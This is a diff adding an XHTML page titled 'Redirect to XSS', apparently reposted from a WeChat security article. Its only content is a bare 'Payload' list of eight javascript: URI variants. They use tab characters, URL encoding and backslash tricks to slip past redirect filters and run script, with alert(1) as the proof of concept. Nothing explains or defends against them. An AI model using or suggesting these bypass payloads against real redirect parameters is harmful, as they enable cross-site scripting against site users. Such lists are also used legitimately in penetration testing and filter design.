@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>重定向到XSS</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>重定向到XSS</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzAwMjQ2NTQ4Mg==&amp;mid=2247489734&amp;idx=1&amp;sn=b6e6c1f05c12553e3cf7c62bd4f8cc55&amp;chksm=9acb5363adbcda75cc46cd0672e478da2ca47462d13149b73a05cbc4a2ae37c4a12d314452d7&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzAwMjQ2NTQ4Mg==&amp;mid=2247489734&amp;idx=1&amp;sn=b6e6c1f05c12553e3cf7c62bd4f8cc55&amp;chksm=9acb5363adbcda75cc46cd0672e478da2ca47462d13149b73a05cbc4a2ae37c4a12d314452d7&amp;scene=27#wechat_redirect</a></blockquote><p data-mpa-powered-by="yiban.io"><img class="rich_pages wxw-img" data-ratio="0.7533333333333333" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/aPmkR80bcV1OGzyRl41Dria4TibaRicXQOJaYPX2fyeibsiaLukgkoRXSIhcYVTlSuIicWciafQ8xCc9haOUQ7raepWbA/640?wx_fmt=jpeg" data-type="jpeg" data-w="600" src="../Images/35ea1da62a1d64ccae88ab242658d383.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/aPmkR80bcV1OGzyRl41Dria4TibaRicXQOJaYPX2fyeibsiaLukgkoRXSIhcYVTlSuIicWciafQ8xCc9haOUQ7raepWbA/640?wx_fmt=jpeg"/></p><p>Payload<br/></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li/><li/><li/><li/><li/><li/><li/><li/></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer"><span class="code-snippet__section">→javascript:alert(1)</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__section">→%09Jav%09ascript:alert(1)</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__section">→javascript://%250Alert(1)</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__section">→/%09/javascript:alert(1);</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__section">→//%5cjavascript:alert(1);</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__section">→&lt;&gt;javascript:alert(1);</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__section">→//javascript:alert(1);</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__section">→\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)</span></span></code></pre></section><p><br/></p>
+        
+</body>
+</html>
